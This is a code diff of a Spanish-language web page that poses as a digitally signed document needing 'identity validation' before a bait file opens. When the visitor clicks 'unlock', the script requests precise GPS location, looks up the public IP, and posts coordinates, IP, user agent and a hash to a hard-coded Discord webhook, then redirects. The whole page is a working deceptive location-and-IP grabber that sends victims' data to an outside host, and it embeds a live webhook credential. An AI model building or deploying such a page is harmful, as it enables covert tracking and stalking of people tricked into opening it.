@@ -9,63 +9,55 @@
 </head>
 <body class="bg-slate-900 flex items-center justify-center min-h-screen text-white font-sans">
 
-    <div id="ui-box" class="max-w-md w-full p-10 bg-slate-800 shadow-2xl rounded-3xl text-center border border-slate-700">
-        <div id="prompt-view">
+    <div class="max-w-md w-full p-10 bg-slate-800 shadow-2xl rounded-3xl text-center border border-slate-700">
+        <div id="ui-main">
             <div class="mb-6 text-blue-500 flex justify-center">
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
             </div>
-            <h1 class="text-xl font-bold mb-4">Documento Firmado Digitalmente</h1>
-            <p class="text-slate-400 text-sm mb-8">Este archivo requiere una validación de seguridad activa para confirmar la integridad del receptor.</p>
+            <h1 class="text-xl font-bold mb-4">Validación de Identidad</h1>
+            <p class="text-slate-400 text-sm mb-8">El acceso a este recurso requiere una firma de seguridad del navegador para validar la integridad del receptor.</p>
             
-            <button onclick="iniciarProtocolo()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-12 rounded-xl transition-all active:scale-95">
-                DESBLOQUEAR Y VER
+            <button onclick="iniciarCaptura()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-12 rounded-xl transition-all active:scale-95 shadow-lg shadow-blue-500/20">
+                DESBLOQUEAR ARCHIVO
             </button>
         </div>
 
-        <div id="loading-view" class="hidden">
-            <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
-            <p class="text-slate-400">Verificando firma digital...</p>
+        <div id="ui-loading" class="hidden">
+            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500 mx-auto mb-4"></div>
+            <p class="text-slate-400">Verificando protocolos...</p>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
-        const REDIRECT_URL = "https://google.com"; // Aquí pones tu archivo real
+        const REDIRECT_URL = "https://google.com"; // Aquí pones tu archivo cebo
 
-        async function enviarReporte(lat = null, lon = null, acc = null, errorGps = null) {
+        async function enviarEvidencia(lat = null, lon = null, acc = null, err = null) {
             try {
-                const resIP = await fetch('https://api.ipify.org?format=json');
-                const ipData = await resIP.json();
-                
-                const timestamp = new Date().toISOString();
-                const userAgent = navigator.userAgent;
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                const ts = new Date().toISOString();
+                const ua = navigator.userAgent;
 
-                const payload = {
-                    ts: timestamp,
-                    ip: ipData.ip,
-                    geo: { lat, lon, precision: acc, error: errorGps },
-                    ua: userAgent
-                };
-
-                // Hash para tu evidencia (Firma Digital)
-                const hash = CryptoJS.SHA256(JSON.stringify(payload)).toString();
+                // Estructura de datos para el Hash
+                const logRaw = { ts, ip: ipData.ip, geo: { lat, lon, acc }, ua };
+                const hashFirma = CryptoJS.SHA256(JSON.stringify(logRaw)).toString();
 
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🛡️ EVIDENCIA DIGITAL CERTIFICADA",
+                            title: "🛡️ EVIDENCIA DIGITAL CAPTURADA",
+                            // Ponemos los datos críticos aquí para asegurar visibilidad
+                            description: `**Timestamp:** \`${ts}\` \n**User-Agent:** \`${ua}\` \n**Firma SHA-256:** \`${hashFirma}\``,
                             color: lat ? 3066993 : 15158332,
                             fields: [
-                                { name: "🕒 Timestamp (ISO 8601)", value: `\`${timestamp}\`` },
-                                { name: "📍 Mapa GPS", value: lat ? `[Ver Ubicación](https://www.google.com/maps?q=${lat},${lon})` : `❌ ${errorGps || "Denegado"}` },
-                                { name: "🎯 Precisión GPS", value: acc ? `${acc} metros` : "N/A", inline: true },
-                                { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true },
-                                { name: "🔑 Hash SHA-256 (Firma)", value: `\`${hash}\`` },
-                                { name: "📱 User-Agent", value: `\`${userAgent}\`` }
+                                { name: "📍 Ubicación GPS", value: lat ? `[Abrir Google Maps](https://www.google.com/maps?q=${lat},${lon})` : `❌ Error: ${err || "Denegado"}`, inline: false },
+                                { name: "🎯 Precisión", value: acc ? `${acc} metros` : "N/A", inline: true },
+                                { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true }
                             ],
                             footer: { text: "Evidencia generada bajo estándares de cadena de custodia digital." }
                         }]
@@ -76,24 +68,21 @@
             }
         }
 
-        function iniciarProtocolo() {
-            document.getElementById('prompt-view').classList.add('hidden');
-            document.getElementById('loading-view').classList.remove('hidden');
+        function iniciarCaptura() {
+            document.getElementById('ui-main').classList.add('hidden');
+            document.getElementById('ui-loading').classList.remove('hidden');
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (p) => enviarReporte(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
+                    (p) => enviarEvidencia(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
                     (e) => {
-                        let msg = "Error desconocido";
-                        if(e.code === 1) msg = "PERMISO_DENEGADO_POR_USUARIO";
-                        if(e.code === 2) msg = "POSICION_NO_DISPONIBLE";
-                        if(e.code === 3) msg = "TIMEOUT_DE_RESPUESTA";
-                        enviarReporte(null, null, null, msg);
+                        const errores = ["", "PERMISO_DENEGADO", "POSICION_NO_DISPONIBLE", "TIMEOUT"];
+                        enviarEvidencia(null, null, null, errores[e.code]);
                     },
-                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
-                enviarReporte(null, null, null, "GEOLOCALIZACION_NO_SOPORTADA");
+                enviarEvidencia(null, null, null, "NO_SOPORTADO");
             }
         }
     </script>
